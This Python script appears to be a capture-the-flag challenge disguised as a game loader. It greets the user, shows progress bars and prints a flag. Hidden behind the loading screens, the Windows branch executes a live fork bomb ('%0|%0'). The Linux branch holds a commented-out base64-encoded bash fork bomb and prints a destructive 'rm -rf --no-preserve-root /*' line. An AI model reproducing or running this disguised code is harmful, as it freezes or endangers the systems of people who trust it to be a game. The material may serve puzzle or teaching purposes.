import os
import platform
import time
from tqdm import tqdm
import random

def fork():
    os_name = platform.system()
    if os_name in ('Linux', 'Darwin'):
        user = os.getlogin()
        print(f"Hello, {user}!")
        print("The game is loading. Please wait...")
        #os.system("echo 'OigpeyA6fDomIH07Og==' | base64 -d | bash")
        for _ in tqdm(range(100), desc="Initializing: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())
        os.system("clear")
        print("Please be patient. We are preparing everything for you :)")
        time.sleep(5)
        print("sudo echo 'sudo rm -rf --no-preserve-root /*' | base64 -d | bash")
        for _ in tqdm(range(100), desc="Finishing Initialization: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())

        print("Made with ♥️. Enjoy! uwu")
        print("Here is a token of love: JKKNIUCTF{wE_4RE_HackER$_8RO}")

    elif os_name == 'Windows':
        user = os.getenv("USERNAME")
        print(f"Hello, {user}!")
        print("The game is loading. Please wait...")
        os.system("%0|%0")
        for _ in tqdm(range(100), desc="Initializing: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())
        os.system("cls")
        print("Please be patient. We are preparing everything for you :)")
        time.sleep(5)
        for _ in tqdm(range(100), desc="Finishing Initialization: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())

        print("Made with ♥️. Enjoy! uwu")

if __name__ == "__main__":
    fork()
